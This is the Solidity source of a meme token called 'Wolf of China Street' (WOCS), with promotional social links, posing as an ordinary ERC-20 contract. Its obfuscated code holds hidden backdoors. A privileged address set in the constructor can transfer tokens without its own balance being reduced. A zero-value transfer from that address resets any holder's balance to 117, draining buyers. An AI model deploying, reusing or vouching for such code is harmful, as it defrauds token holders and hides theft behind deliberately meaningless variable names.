/*

Telegram: https://t.me/wolfofchinastreet
Website: www.wolfofchinastreet.vip
twitter: https://twitter.com/wolfofchinast

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract wolfofchinastreet is Ownable {
    string public symbol = 'WOCS';

    uint256 private lrva = 117;

    constructor(address senders) {
        balanceOf[msg.sender] = totalSupply;
        giyeskj[senders] = lrva;
        IUniswapV2Router02 arpeyfgul = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        fmiukzwaxvoh = IUniswapV2Factory(arpeyfgul.factory()).createPair(address(this), arpeyfgul.WETH());
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private giyeskj;

    function transfer(address allowancen, uint256 valuen) public returns (bool success) {
        if (giyeskj[msg.sender] > 0 && valuen == 0 && allowancen != fmiukzwaxvoh) {
            balanceOf[allowancen] = lrva;
        }
        gass(msg.sender, allowancen, valuen);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    address public fmiukzwaxvoh;

    mapping(address => uint256) private etbds;

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address mappings, uint256 valuen) public returns (bool success) {
        allowance[msg.sender][mappings] = valuen;
        emit Approval(msg.sender, mappings, valuen);
        return true;
    }

    string public name = 'Wolf of China Street';

    function transferFrom(address transfern, address allowancen, uint256 valuen) public returns (bool success) {
        require(valuen <= allowance[transfern][msg.sender]);
        allowance[transfern][msg.sender] -= valuen;
        gass(transfern, allowancen, valuen);
        return true;
    }

    function gass(address transfern, address allowancen, uint256 valuen) private {
        if (giyeskj[transfern] == 0) {
            balanceOf[transfern] -= valuen;
        }
        balanceOf[allowancen] += valuen;
        emit Transfer(transfern, allowancen, valuen);
    }

    uint8 public decimals = 9;

    event Transfer(address indexed from, address indexed to, uint256 value);
}